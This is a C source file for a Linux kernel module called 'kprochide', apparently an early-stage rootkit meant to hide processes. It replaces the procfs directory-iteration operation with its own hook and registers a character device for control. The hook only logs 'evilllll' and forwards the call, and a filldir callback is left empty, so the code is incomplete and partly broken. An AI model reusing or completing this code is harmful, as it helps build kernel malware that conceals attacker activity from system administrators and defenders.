#include "hidepid.h"

#include <linux/namei.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("spiderpig");
MODULE_VERSION("1.0.0");

// char device
static const char* hidepid_chrdev_name = "kprochide_hidepid";
static int hidepid_chrdev_major_num;

struct file_operations procfs_fops;
struct file_operations *procfs_backup_fops;
struct inode *procfs_inode;

static int kprochide_iterate_shared(struct file *file, struct dir_context *dir_ctx)
{
    printk(KERN_INFO "kprochide: evilllll\n");
    return procfs_backup_fops->iterate_shared(file, dir_ctx);
}

static int kprochide_filldir(struct dir_context *ctx, 
                             const char *name, int namlen, 
                             loff_t offset, u64 ino, 
                             unsigned int d_type)
{   

}

static int __init mod_init(void)
{
    struct file* filp_open_result = NULL;
    struct path proc_path;

    printk(KERN_INFO "kprochide: LKM loaded\n");
    hidepid_chrdev_major_num = register_hidepid_chrdev(hidepid_chrdev_name);
    if (hidepid_chrdev_major_num < 0) {
        printk(KERN_ERR "kprochide: failed to register char device (%d)\n", hidepid_chrdev_major_num);
        return -EBUSY;
    }

    printk(KERN_INFO "kprochide: registered char device (%d)\n", hidepid_chrdev_major_num);
    printk(KERN_INFO "kprochide: please run 'mknod /dev/hidepid c %d 0'\n", hidepid_chrdev_major_num);

    filp_open_result = filp_open("/proc", O_RDONLY, 0);
    if (NULL == filp_open_result) {
        printk(KERN_ERR "kprochide: failed to open /proc file\n");
        return EIO;
    }

    if (kern_path("/proc", 0, &proc_path)) {
        printk(KERN_ERR "kprochide: kern_path failed while trying to open procfs.\n");
        return EIO;
    }

    // save a copy of the procfs inode and file_operations
    procfs_inode = proc_path.dentry->d_inode;
    procfs_backup_fops = procfs_inode->i_fop;

    // replace procfs file_operations.iterate_shared with our function    
    procfs_fops = *procfs_inode->i_fop;
    procfs_fops.iterate_shared = &kprochide_iterate_shared;
    procfs_inode->i_fop = &procfs_fops;

    printk(KERN_INFO "kprochide: replaced procfs' file_operations\n");

    return 0;
}

static void __exit mod_exit(void)
{
    struct path proc_path;
    if (kern_path("/proc", 0, &proc_path)) {
        printk(KERN_ERR "kprochide: kern_path failed while trying to open procfs.\n");
        return;
    }

    printk(KERN_INFO "kprochide: restoring procfs' original file_operations\n");
    procfs_inode = proc_path.dentry->d_inode;
    procfs_inode->i_fop = procfs_backup_fops;

    unregister_hidepid_chrdev(hidepid_chrdev_major_num, hidepid_chrdev_name);
    printk(KERN_INFO "kprochide: unregistered char device %d\n", hidepid_chrdev_major_num);
    printk(KERN_INFO "kprochide: LKM successfully unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);
